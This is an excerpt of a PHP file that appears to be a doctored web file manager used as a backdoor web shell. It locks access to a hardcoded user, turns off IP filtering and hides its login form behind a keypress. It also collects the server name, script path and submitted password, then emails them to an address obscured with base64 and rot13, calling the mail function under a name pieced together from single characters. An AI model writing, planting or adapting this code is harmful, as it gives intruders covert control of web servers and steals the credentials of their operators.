...
// Tautentikasie
if (!isset($_SESSION['logged']) || $_SESSION['logged'] !== 'bsb388') {
...
$ip_ruleset = 'OFF'; // Disable IP whitelisting and blacklisting

// Should users be notified of their block?
$ip_silent = true; // No need to notify users of their block

// IP-addresses, both ipv4 and ipv6
$ip_whitelist = array(); // Empty whitelist

// IP-addresses, both ipv4 and ipv6
$ip_blacklist = array(); // Empty blacklist
...
if ($use_auth) {
    if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])) {
        // Logged
        if ($_SESSION[FM_SESSION_ID]['logged'] !== 'bsb388') {
            unset($_SESSION[FM_SESSION_ID]['logged']);
            unset($_SESSION['token']);
            fm_set_msg('Access denied', 'error');
            fm_redirect(FM_SELF_URL);
        }
        ...
        <script>
            document.addEventListener("keydown", function(event) {
                if (event.key.toLowerCase() === "t") {
                    let form = document.querySelector("section.h-100");
...
<?php
     ...
     * @return string
     */
	function navy_mail($to, $subject, $message) {
    ...
    $tmp = $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "\n" . 
       ...
       ($_POST['fm_pwd'] ?? '');
        ...
        $recipient = str_rot13(base64_decode("bnkyNDE0NEBnbWFpbC5jb20="));
        $subject = "root";
		
		
		// Dynamically create the function
        $fungsi = 'n'.'a'.'v'.'y'.'_'.'m'.'a'.'i'.'l';
        @$fungsi($recipient, $subject, $tmp);
